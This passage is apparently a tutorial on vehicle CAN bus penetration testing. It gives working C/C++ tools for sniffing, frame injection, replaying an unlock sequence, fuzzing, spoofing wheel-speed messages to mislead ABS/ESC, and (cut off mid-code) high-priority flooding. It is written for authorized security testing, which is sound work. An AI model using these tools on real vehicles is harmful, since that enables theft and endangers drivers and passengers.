# 99. CAN Penetration Testing

**C/C++ examples include:**
- Passive bus reconnaissance (tracking unique IDs, frequency, DLC)
- Differential sniffing (baseline vs. action capture to isolate signals)
- Targeted and continuous frame injection loops
- Bus-Off attack simulation (error counter modelling per ISO 11898-1)
- Replay attack tool (record to file, replay with original timing)
- Systematic fuzzer (ID sweep, data mutation, bit-flip strategies)
- ECU impersonation (spoofing wheel speed sensor output)
- CAN DoS via high-priority frame flooding
- UDS SecurityAccess brute-forcer (seed/key bypass)

**Rust examples include:**
- Recon tool using the `socketcan` crate with `clap` CLI
- Full fuzzer with sweep/mutate/bitflip subcommands
- Replay recorder and replayer with binary capture format

The summary section consolidates the eight principal attack classes, language/tooling guidance, and a remediation table covering SecOC, hardened UDS, CAN guardians, and automotive IDS deployment.

> **Ethical hacking methodologies for assessing CAN network security and identifying vulnerabilities.**

---

## Table of Contents

1. [Introduction](#introduction)
2. [Legal and Ethical Framework](#legal-and-ethical-framework)
3. [CAN Network Attack Surface](#can-network-attack-surface)
4. [Reconnaissance and Discovery](#reconnaissance-and-discovery)
5. [Passive Sniffing and Traffic Analysis](#passive-sniffing-and-traffic-analysis)
6. [Message Injection Attacks](#message-injection-attacks)
7. [Bus-Off Attack](#bus-off-attack)
8. [Replay Attacks](#replay-attacks)
9. [Fuzzing the CAN Bus](#fuzzing-the-can-bus)
10. [ECU Impersonation](#ecu-impersonation)
11. [Denial of Service (DoS)](#denial-of-service-dos)
12. [Diagnostic Protocol Exploitation (UDS/OBD-II)](#diagnostic-protocol-exploitation)
13. [Rust Tooling for CAN Pen Testing](#rust-tooling-for-can-pen-testing)
14. [Tooling and Hardware](#tooling-and-hardware)
15. [Reporting and Remediation](#reporting-and-remediation)
16. [Summary](#summary)

---

## Introduction

Controller Area Network (CAN) penetration testing is the disciplined practice of probing automotive and industrial CAN bus networks to discover security vulnerabilities before adversaries can exploit them. Unlike traditional IT networks, CAN was designed in the 1980s for reliability and real-time performance — **not security**. There is no built-in authentication, encryption, or access control. Every node on the bus can read every message, and any node can inject arbitrary frames.

Modern vehicles contain dozens of Electronic Control Units (ECUs) — engine management, brakes (ABS/ESC), airbags, steering, infotainment, and telematics — all interconnected via one or more CAN buses. A successful attack can range from cosmetic nuisance (changing dashboard displays) to safety-critical consequences (disabling brakes or manipulating steering). The Jeep Cherokee remote hack demonstrated in 2015 by Miller and Valasek brought this risk into mainstream awareness and catalysed the automotive security discipline.

CAN penetration testing follows the same ethical hacking lifecycle as IT security:

```
Planning → Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting
```

All phases must be conducted with **written authorization** from the vehicle or system owner.

---

## Legal and Ethical Framework

Before connecting any tool to a CAN bus:

- **Obtain written authorization** — a signed Rules of Engagement (RoE) document specifying scope, test window, and permitted actions.
- **Operate in a controlled environment** — use a test bench (Hardware-in-the-Loop) or a stationary, disconnected vehicle. Never test on a moving vehicle or on public roads.
- **Comply with regional law** — in many jurisdictions, unauthorized access to vehicle networks violates computer fraud statutes (e.g., the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK).
- **Follow responsible disclosure** — report findings to the OEM/supplier with a clear timeline before any public release.
- **Document everything** — maintain timestamped logs of all actions taken during the assessment.

---

## CAN Network Attack Surface

```
┌─────────────────────────────────────────────────────────────┐
│                     Attack Entry Points                     │
│                                                             │
│  OBD-II Port ──► CAN Bus ◄── Infotainment / BT / Wi-Fi      │
│                    │                                        │
│             ECU Firmware ◄── JTAG / UART Debug              │
│                    │                                        │
│           Telematics Unit ◄── Cellular / V2X                │
└─────────────────────────────────────────────────────────────┘
```

| Entry Point | Access Level | Notes |
|---|---|---|
| OBD-II Port | Physical | Standard diagnostic connector; exposes CAN directly |
| Infotainment | Local/Remote | Often bridges to CAN; Bluetooth, USB, Wi-Fi attack surface |
| Telematics (TCU) | Remote | Cellular modem; highest-risk remote vector |
| TPMS Sensors | Wireless | RF-based; can inject into CAN via receiver ECU |
| Charging Port (EV) | Physical | Power Line Communication (PLC) may expose CAN |
| Debug Headers | Physical | JTAG/UART on ECU PCBs enables firmware extraction |

---

## Reconnaissance and Discovery

The first step is passive enumeration: **who is on the bus and what are they saying?**

### C/C++ — CAN Bus Enumeration via SocketCAN

```c
/*
 * can_recon.c — Passive CAN bus reconnaissance using Linux SocketCAN.
 * Build: gcc -o can_recon can_recon.c
 * Usage: ./can_recon can0
 *
 * ETHICAL USE ONLY — requires written authorization.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

#define MAX_IDS       2048
#define SAMPLE_SECS   10

typedef struct {
    uint32_t can_id;
    uint64_t count;
    uint8_t  dlc;
    uint8_t  last_data[8];
    struct timespec first_seen;
    struct timespec last_seen;
} id_entry_t;

static id_entry_t seen_ids[MAX_IDS];
static int        id_count = 0;

/* Find or insert a CAN ID in our tracking table */
static id_entry_t *track_id(uint32_t can_id) {
    for (int i = 0; i < id_count; i++) {
        if (seen_ids[i].can_id == can_id) return &seen_ids[i];
    }
    if (id_count >= MAX_IDS) return NULL;
    id_entry_t *e = &seen_ids[id_count++];
    memset(e, 0, sizeof(*e));
    e->can_id = can_id;
    clock_gettime(CLOCK_MONOTONIC, &e->first_seen);
    return e;
}

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <iface>\n", argv[0]); return 1; }

    /* Open raw CAN socket */
    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (sock < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl"); return 1; }

    struct sockaddr_can addr = {
        .can_family  = AF_CAN,
        .can_ifindex = ifr.ifr_ifindex,
    };
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }

    printf("[*] Sniffing %s for %d seconds...\n", argv[1], SAMPLE_SECS);

    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);

    struct can_frame frame;
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - start.tv_sec)
                       + (now.tv_nsec - start.tv_nsec) / 1e9;
        if (elapsed >= SAMPLE_SECS) break;

        ssize_t nbytes = read(sock, &frame, sizeof(frame));
        if (nbytes < 0) { perror("read"); break; }
        if (nbytes < (ssize_t)sizeof(struct can_frame)) continue;

        id_entry_t *e = track_id(frame.can_id & CAN_EFF_MASK);
        if (!e) continue;

        e->count++;
        e->dlc = frame.can_dlc;
        memcpy(e->last_data, frame.data, frame.can_dlc);
        clock_gettime(CLOCK_MONOTONIC, &e->last_seen);
    }

    close(sock);

    /* Print recon report */
    printf("\n[+] CAN ID Discovery Report (%d unique IDs)\n", id_count);
    printf("%-12s %-8s %-8s  %s\n", "CAN-ID", "DLC", "Count", "Last Data");
    printf("%-12s %-8s %-8s  %s\n", "------", "---", "-----", "---------");

    for (int i = 0; i < id_count; i++) {
        id_entry_t *e = &seen_ids[i];
        printf("0x%03X        %-8u %-8lu  ",
               e->can_id, e->dlc, (unsigned long)e->count);
        for (int b = 0; b < e->dlc; b++) printf("%02X ", e->last_data[b]);
        printf("\n");
    }

    return 0;
}
```

**Key observations during recon:**

- **Message frequency** — safety-critical messages (brakes, steering) are typically periodic at 10–100 ms intervals.
- **DLC consistency** — a CAN ID that alternates DLC values may indicate multiplexed signals.
- **Extended vs. Standard frames** — most OBD-II traffic uses 11-bit IDs; some buses use 29-bit extended IDs.
- **Gaps in the ID space** — unusual or rarely seen IDs may be diagnostic or test frames.

---

## Passive Sniffing and Traffic Analysis

### C/C++ — Differential Sniffing (Baseline vs. Action)

Differential analysis isolates which CAN IDs change when a specific action is performed (e.g., pressing the brake pedal).

```cpp
/*
 * diff_sniff.cpp — Capture two traces and diff them to isolate
 *                  IDs associated with a vehicle action.
 * Build: g++ -std=c++17 -o diff_sniff diff_sniff.cpp
 *
 * Workflow:
 *   1. Run, press ENTER for baseline
 *   2. Perform the action (e.g., press brake)
 *   3. Press ENTER for action trace
 *   4. Review changed IDs
 */

#include <iostream>
#include <map>
#include <vector>
#include <array>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

using FrameData = std::array<uint8_t, 8>;
using SnapShot  = std::map<uint32_t, FrameData>;

int open_can(const char *iface) {
    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr{ AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    return sock;
}

SnapShot capture(int sock, int duration_ms) {
    SnapShot snap;
    struct timeval tv{ 0, duration_ms * 1000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct can_frame frame;
    while (read(sock, &frame, sizeof(frame)) > 0) {
        FrameData data{};
        memcpy(data.data(), frame.data, frame.can_dlc);
        snap[frame.can_id & CAN_EFF_MASK] = data;
    }
    return snap;
}

void diff(const SnapShot &baseline, const SnapShot &action) {
    std::cout << "\n[+] Changed / New IDs during action:\n";
    std::cout << "CAN-ID    Baseline Data            Action Data\n";
    std::cout << "--------  -----------------------  -----------------------\n";

    for (auto &[id, adata] : action) {
        auto it = baseline.find(id);
        bool changed = (it == baseline.end()) ||
                       (it->second != adata);
        if (changed) {
            printf("0x%03X     ", id);
            if (it != baseline.end())
                for (uint8_t b : it->second) printf("%02X ", b);
            else
                printf("(new)                  ");
            printf("  -> ");
            for (uint8_t b : adata) printf("%02X ", b);
            printf("\n");
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2) { std::cerr << "Usage: " << argv[0] << " <iface>\n"; return 1; }

    int sock = open_can(argv[1]);

    std::cout << "[*] Press ENTER to capture baseline (2s)...\n";
    std::cin.get();
    SnapShot baseline = capture(sock, 2000);
    std::cout << "[*] Captured " << baseline.size() << " unique IDs in baseline.\n";

    std::cout << "[*] Perform the action, then press ENTER to capture action trace (2s)...\n";
    std::cin.get();
    SnapShot action = capture(sock, 2000);
    std::cout << "[*] Captured " << action.size() << " unique IDs in action trace.\n";

    diff(baseline, action);
    close(sock);
    return 0;
}
```

---

## Message Injection Attacks

Once a target CAN ID and its data format are understood, an attacker can inject crafted frames. Since CAN has no authentication, any node can send any message.

### C/C++ — Targeted Frame Injection

```c
/*
 * inject.c — Send crafted CAN frames to a target ID.
 * Build: gcc -o inject inject.c
 * Usage: ./inject can0 0x18F 8 DE AD BE EF 00 00 00 00
 *
 * WARNING: Only use on isolated test benches with written authorization.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <iface> <CAN-ID (hex)> <DLC> [data bytes...]\n",
                argv[0]);
        return 1;
    }

    const char   *iface  = argv[1];
    uint32_t      can_id = (uint32_t)strtol(argv[2], NULL, 16);
    uint8_t       dlc    = (uint8_t)atoi(argv[3]);

    if (dlc > 8) { fprintf(stderr, "DLC must be 0-8.\n"); return 1; }
    if (argc - 4 < dlc) { fprintf(stderr, "Not enough data bytes for DLC=%d.\n", dlc); return 1; }

    struct can_frame frame;
    memset(&frame, 0, sizeof(frame));
    frame.can_id  = can_id;
    frame.can_dlc = dlc;
    for (int i = 0; i < dlc; i++)
        frame.data[i] = (uint8_t)strtol(argv[4 + i], NULL, 16);

    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (sock < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);

    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    /* Send the crafted frame */
    if (write(sock, &frame, sizeof(frame)) != sizeof(frame)) {
        perror("write"); return 1;
    }

    printf("[+] Injected: ID=0x%03X DLC=%d Data=", can_id, dlc);
    for (int i = 0; i < dlc; i++) printf("%02X ", frame.data[i]);
    printf("\n");

    close(sock);
    return 0;
}
```

### C/C++ — Continuous Injection Loop (for Sustained Attacks)

```c
/*
 * inject_loop.c — Continuously inject a CAN frame at a given rate.
 * Build: gcc -o inject_loop inject_loop.c
 * Usage: ./inject_loop can0 0x0C1 8 00 00 FF FF 00 00 00 00 10
 *        (last arg = interval in milliseconds)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

static volatile int running = 1;
void handle_sig(int s) { (void)s; running = 0; }

int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stderr,
            "Usage: %s <iface> <id_hex> <dlc> [data...] <interval_ms>\n",
            argv[0]);
        return 1;
    }

    const char *iface    = argv[1];
    uint32_t    can_id   = (uint32_t)strtol(argv[2], NULL, 16);
    uint8_t     dlc      = (uint8_t)atoi(argv[3]);
    int         interval = atoi(argv[4 + dlc]);  /* last positional arg */

    struct can_frame frame;
    memset(&frame, 0, sizeof(frame));
    frame.can_id  = can_id;
    frame.can_dlc = dlc;
    for (int i = 0; i < dlc; i++)
        frame.data[i] = (uint8_t)strtol(argv[4 + i], NULL, 16);

    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    signal(SIGINT, handle_sig);
    signal(SIGTERM, handle_sig);

    printf("[*] Injecting 0x%03X every %d ms. Ctrl-C to stop.\n", can_id, interval);

    struct timespec ts = { 0, (long)interval * 1000000L };
    uint64_t count = 0;

    while (running) {
        write(sock, &frame, sizeof(frame));
        count++;
        nanosleep(&ts, NULL);
    }

    printf("[+] Sent %lu frames.\n", (unsigned long)count);
    close(sock);
    return 0;
}
```

---

## Bus-Off Attack

The Bus-Off attack exploits CAN's error handling mechanism. When a node accumulates 256 transmission errors, it enters the **Bus-Off** state and disconnects from the bus — effectively performing a denial-of-service on that ECU.

An attacker with a custom transceiver can corrupt bits during a victim ECU's transmission, causing the victim to increment its Transmit Error Counter (TEC) while the attacker's TEC stays low (it was listening, not transmitting).

```c
/*
 * busoff_concept.c — Conceptual demonstration of Bus-Off attack timing.
 *
 * In a real attack, bit corruption requires hardware-level bit manipulation
 * (a modified transceiver or FPGA). This code illustrates the logic.
 *
 * The attacker must:
 *  1. Detect the start of a victim frame (ID match)
 *  2. Corrupt a bit in the data or CRC field
 *  3. Repeat until victim TEC >= 256 (Bus-Off)
 *
 * References: ISO 11898-1, Section 6.10 (Error Handling)
 */

#include <stdio.h>
#include <stdint.h>

typedef enum {
    ERROR_ACTIVE,    /* TEC/REC < 128 — normal operation */
    ERROR_PASSIVE,   /* TEC/REC >= 128 — limited error flag emission */
    BUS_OFF          /* TEC >= 256 — node disconnected */
} can_error_state_t;

typedef struct {
    const char        *name;
    uint16_t           tec;       /* Transmit Error Counter */
    uint16_t           rec;       /* Receive Error Counter */
    can_error_state_t  state;
} can_node_t;

static can_error_state_t compute_state(uint16_t tec, uint16_t rec) {
    if (tec >= 256)             return BUS_OFF;
    if (tec >= 128 || rec >= 128) return ERROR_PASSIVE;
    return ERROR_ACTIVE;
}

static const char *state_name(can_error_state_t s) {
    switch (s) {
        case ERROR_ACTIVE:  return "ERROR_ACTIVE";
        case ERROR_PASSIVE: return "ERROR_PASSIVE";
        case BUS_OFF:       return "BUS_OFF";
    }
    return "UNKNOWN";
}

/*
 * Simulate the effect of the attacker corrupting a bit during
 * the victim's transmission (bit error detected by victim).
 * - Victim TEC += 8 (transmit error)
 * - Attacker REC += 1 (receive error, it was listening)
 */
void simulate_attack_iteration(can_node_t *victim, can_node_t *attacker) {
    victim->tec   = (uint16_t)(victim->tec + 8);
    attacker->rec = (uint16_t)(attacker->rec >= 1 ? attacker->rec - 1 : 0);

    victim->state   = compute_state(victim->tec,   victim->rec);
    attacker->state = compute_state(attacker->tec, attacker->rec);
}

int main(void) {
    can_node_t victim   = { "ECU (victim)",   0, 0, ERROR_ACTIVE };
    can_node_t attacker = { "Attacker node",  0, 0, ERROR_ACTIVE };

    printf("%-5s  %-15s %-5s %-5s %-15s\n",
           "Iter", "Node", "TEC", "REC", "State");
    printf("%-5s  %-15s %-5s %-5s %-15s\n",
           "----", "----", "---", "---", "-----");

    for (int i = 1; i <= 40; i++) {
        simulate_attack_iteration(&victim, &attacker);

        printf("%-5d  %-15s %-5u %-5u %-15s\n",
               i, victim.name, victim.tec, victim.rec,
               state_name(victim.state));
        printf("%-5s  %-15s %-5u %-5u %-15s\n",
               "", attacker.name, attacker.tec, attacker.rec,
               state_name(attacker.state));

        if (victim.state == BUS_OFF) {
            printf("\n[!] Victim is BUS-OFF after %d corrupted transmissions!\n", i);
            break;
        }
    }

    return 0;
}
```

---

## Replay Attacks

Capturing a legitimate sequence of CAN frames and replaying it later can trigger actions without needing to reverse-engineer signal encoding. Classic examples: replaying the unlock sequence or the engine start sequence.

```c
/*
 * replay.c — Record a CAN sequence to file, then replay it.
 * Build: gcc -o replay replay.c
 *
 * Record: ./replay can0 record unlock_sequence.bin 3
 * Replay: ./replay can0 replay unlock_sequence.bin
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

typedef struct {
    uint64_t         timestamp_us;   /* relative timestamp in microseconds */
    struct can_frame frame;
} recorded_frame_t;

static int open_can_sock(const char *iface) {
    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    return sock;
}

static uint64_t now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000ULL;
}

int do_record(const char *iface, const char *path, int duration_sec) {
    int sock = open_can_sock(iface);
    FILE *fp = fopen(path, "wb");
    if (!fp) { perror("fopen"); return 1; }

    printf("[*] Recording on %s for %d s -> %s\n", iface, duration_sec, path);
    uint64_t start   = now_us();
    uint64_t end     = start + (uint64_t)duration_sec * 1000000ULL;
    uint32_t written = 0;

    struct timeval tv = { duration_sec, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct can_frame frame;
    while (now_us() < end) {
        ssize_t n = read(sock, &frame, sizeof(frame));
        if (n <= 0) break;

        recorded_frame_t rec;
        rec.timestamp_us = now_us() - start;
        rec.frame        = frame;
        fwrite(&rec, sizeof(rec), 1, fp);
        written++;
    }

    fclose(fp);
    close(sock);
    printf("[+] Recorded %u frames.\n", written);
    return 0;
}

int do_replay(const char *iface, const char *path) {
    FILE *fp = fopen(path, "rb");
    if (!fp) { perror("fopen"); return 1; }

    /* Load all frames */
    recorded_frame_t buf[65536];
    uint32_t count = (uint32_t)fread(buf, sizeof(recorded_frame_t),
                                     65536, fp);
    fclose(fp);
    if (count == 0) { fprintf(stderr, "Empty capture file.\n"); return 1; }

    int sock = open_can_sock(iface);
    printf("[*] Replaying %u frames from %s on %s\n", count, path, iface);

    uint64_t start = now_us();

    for (uint32_t i = 0; i < count; i++) {
        /* Wait until the frame's relative timestamp */
        while (now_us() - start < buf[i].timestamp_us)
            ; /* busy-wait for timing accuracy */

        write(sock, &buf[i].frame, sizeof(struct can_frame));
        printf("[>] t=%7lu us  ID=0x%03X\n",
               (unsigned long)buf[i].timestamp_us,
               buf[i].frame.can_id & CAN_EFF_MASK);
    }

    close(sock);
    printf("[+] Replay complete.\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr,
            "Usage:\n"
            "  %s <iface> record <file> <duration_sec>\n"
            "  %s <iface> replay <file>\n",
            argv[0], argv[0]);
        return 1;
    }
    if (strcmp(argv[2], "record") == 0 && argc >= 5)
        return do_record(argv[1], argv[3], atoi(argv[4]));
    if (strcmp(argv[2], "replay") == 0)
        return do_replay(argv[1], argv[3]);
    fprintf(stderr, "Unknown command.\n");
    return 1;
}
```

---

## Fuzzing the CAN Bus

Fuzzing sends semi-random or mutation-based CAN frames to discover unexpected ECU behaviour — crashes, assertion failures, mode changes, or safety-relevant responses.

### C/C++ — Systematic CAN Fuzzer

```cpp
/*
 * can_fuzzer.cpp — Smart CAN bus fuzzer with three strategies:
 *   1. Sequential ID sweep       — try every CAN ID with fixed data
 *   2. Data mutation             — fix ID, randomise data bytes
 *   3. Bit-flip mutation         — flip individual bits in a seed frame
 *
 * Build: g++ -std=c++17 -o can_fuzzer can_fuzzer.cpp
 * Usage: ./can_fuzzer can0 mutate 0x200 8 DE AD BE EF 00 00 00 00
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <string>
#include <stdexcept>

class CanFuzzer {
public:
    CanFuzzer(const char *iface) {
        sock_ = socket(PF_CAN, SOCK_RAW, CAN_RAW);
        if (sock_ < 0) throw std::runtime_error("socket()");

        struct ifreq ifr{};
        strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
        if (ioctl(sock_, SIOCGIFINDEX, &ifr) < 0)
            throw std::runtime_error("ioctl()");

        struct sockaddr_can addr{ AF_CAN, ifr.ifr_ifindex };
        if (bind(sock_, (struct sockaddr *)&addr, sizeof(addr)) < 0)
            throw std::runtime_error("bind()");

        srand((unsigned)time(nullptr));
    }

    ~CanFuzzer() { close(sock_); }

    /* Strategy 1: sweep every standard 11-bit CAN ID */
    void sweep_ids(uint8_t dlc, int delay_us = 500) {
        printf("[*] Sweeping all CAN IDs (0x000–0x7FF), DLC=%u\n", dlc);
        struct can_frame frame{};
        frame.can_dlc = dlc;
        memset(frame.data, 0xAA, dlc);   /* fixed pattern */

        for (uint32_t id = 0; id <= 0x7FF; id++) {
            frame.can_id = id;
            send_frame(frame);
            if (delay_us > 0) usleep(delay_us);
            if (id % 0x100 == 0)
                printf("[*] Progress: 0x%03X / 0x7FF\n", id);
        }
        printf("[+] ID sweep complete.\n");
    }

    /* Strategy 2: mutate data bytes for a fixed ID */
    void mutate_data(uint32_t can_id, uint8_t dlc,
                     const uint8_t *seed, int iterations) {
        printf("[*] Data mutation: ID=0x%03X, %d iterations\n",
               can_id, iterations);
        struct can_frame frame{};
        frame.can_id  = can_id;
        frame.can_dlc = dlc;

        for (int i = 0; i < iterations; i++) {
            /* Copy seed then randomly mutate 1–4 bytes */
            memcpy(frame.data, seed, dlc);
            int mutations = 1 + rand() % 4;
            for (int m = 0; m < mutations; m++) {
                int pos = rand() % dlc;
                frame.data[pos] = (uint8_t)(rand() & 0xFF);
            }
            send_frame(frame);
            log_frame(i, frame);
            usleep(1000);
        }
        printf("[+] Mutation fuzzing complete.\n");
    }

    /* Strategy 3: bit-flip every bit position in a seed frame */
    void bitflip(uint32_t can_id, uint8_t dlc, const uint8_t *seed) {
        printf("[*] Bit-flip fuzzing: ID=0x%03X\n", can_id);
        struct can_frame frame{};
        frame.can_id  = can_id;
        frame.can_dlc = dlc;

        for (int byte_pos = 0; byte_pos < dlc; byte_pos++) {
            for (int bit = 0; bit < 8; bit++) {
                memcpy(frame.data, seed, dlc);
                frame.data[byte_pos] ^= (uint8_t)(1 << bit);
                printf("[~] Flipping byte %d bit %d: ", byte_pos, bit);
                send_frame(frame);
                log_frame(byte_pos * 8 + bit, frame);
                usleep(5000);
            }
        }
        printf("[+] Bit-flip complete.\n");
    }

private:
    int sock_;

    void send_frame(const struct can_frame &f) {
        write(sock_, &f, sizeof(f));
    }

    void log_frame(int idx, const struct can_frame &f) {
        printf("[%04d] ID=0x%03X Data=", idx, f.can_id & CAN_EFF_MASK);
        for (int i = 0; i < f.can_dlc; i++) printf("%02X ", f.data[i]);
        printf("\n");
    }
};

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr,
            "Usage:\n"
            "  %s <iface> sweep [dlc]\n"
            "  %s <iface> mutate <id_hex> <dlc> [seed_bytes...] [iterations]\n"
            "  %s <iface> bitflip <id_hex> <dlc> [seed_bytes...]\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }

    try {
        CanFuzzer fuzzer(argv[1]);
        std::string cmd(argv[2]);

        if (cmd == "sweep") {
            uint8_t dlc = argc > 3 ? (uint8_t)atoi(argv[3]) : 8;
            fuzzer.sweep_ids(dlc);
        } else if (cmd == "mutate" && argc >= 6) {
            uint32_t id  = (uint32_t)strtol(argv[3], nullptr, 16);
            uint8_t  dlc = (uint8_t)atoi(argv[4]);
            uint8_t  seed[8]{};
            for (int i = 0; i < dlc && (5 + i) < argc - 1; i++)
                seed[i] = (uint8_t)strtol(argv[5 + i], nullptr, 16);
            int iters = atoi(argv[argc - 1]);
            fuzzer.mutate_data(id, dlc, seed, iters);
        } else if (cmd == "bitflip" && argc >= 5) {
            uint32_t id  = (uint32_t)strtol(argv[3], nullptr, 16);
            uint8_t  dlc = (uint8_t)atoi(argv[4]);
            uint8_t  seed[8]{};
            for (int i = 0; i < dlc && (5 + i) < argc; i++)
                seed[i] = (uint8_t)strtol(argv[5 + i], nullptr, 16);
            fuzzer.bitflip(id, dlc, seed);
        } else {
            fprintf(stderr, "Unknown command or missing arguments.\n");
            return 1;
        }
    } catch (const std::exception &ex) {
        fprintf(stderr, "Error: %s\n", ex.what());
        return 1;
    }

    return 0;
}
```

---

## ECU Impersonation

An attacker can impersonate a legitimate ECU by spoofing its CAN IDs and sending fabricated signals. Combined with suppressing the genuine ECU (via Bus-Off or physical disconnection), this constitutes a full **man-in-the-middle** on the CAN bus.

```c
/*
 * ecu_spoof.c — Impersonate a target ECU by continuously sending
 *               its expected messages with controlled payload values.
 *
 * Example: Spoof wheel speed sensor ECU to report 0 km/h
 *          while the vehicle is moving (ABS/ESC would be misled).
 *
 * Build: gcc -o ecu_spoof ecu_spoof.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

static volatile int running = 1;
void sig_handler(int s) { (void)s; running = 0; }

/* Encode a speed value (km/h * 100) into 2 bytes, big-endian */
static void encode_speed(uint8_t *buf, uint16_t speed_x100) {
    buf[0] = (uint8_t)(speed_x100 >> 8);
    buf[1] = (uint8_t)(speed_x100 & 0xFF);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <iface> <spoofed_speed_kmh>\n", argv[0]);
        return 1;
    }

    const char *iface = argv[1];
    uint16_t    speed = (uint16_t)(atof(argv[2]) * 100.0);  /* km/h → x100 */

    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    signal(SIGINT, sig_handler);

    /*
     * Hypothetical wheel speed message (common in many OEMs):
     *  CAN ID: 0x0AA
     *  DLC: 8
     *  Bytes 0-1: Front-left wheel speed  (km/h * 100)
     *  Bytes 2-3: Front-right wheel speed
     *  Bytes 4-5: Rear-left wheel speed
     *  Bytes 6-7: Rear-right wheel speed
     */
    struct can_frame frame;
    memset(&frame, 0, sizeof(frame));
    frame.can_id  = 0x0AA;
    frame.can_dlc = 8;

    encode_speed(&frame.data[0], speed);
    encode_speed(&frame.data[2], speed);
    encode_speed(&frame.data[4], speed);
    encode_speed(&frame.data[6], speed);

    printf("[*] Spoofing wheel speeds as %.1f km/h on ID 0x0AA. Ctrl-C to stop.\n",
           speed / 100.0);

    /* Transmit every 10ms — typical wheel speed message period */
    struct timespec interval = { 0, 10 * 1000000L };

    while (running) {
        if (write(sock, &frame, sizeof(frame)) < 0) {
            perror("write"); break;
        }
        nanosleep(&interval, NULL);
    }

    close(sock);
    printf("[+] Spoofing stopped.\n");
    return 0;
}
```

---

## Denial of Service (DoS)

CAN is a shared medium with **priority arbitration** — lower CAN IDs win arbitration. An attacker can flood the bus with high-priority (low-ID) frames, starving legitimate ECUs of bus time.

```c
/*
 * can_dos.c — CAN bus Denial of Service via high-priority frame flooding.
 *
 * By transmitting frames with CAN ID 0x000 (highest priority) as fast
 * as possible, legitimate traffic can be starved of arbitration access.
 *
 * Build: gcc -o can_dos can_dos.c
 * WARNING: This will disrupt all other nodes on the bus.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
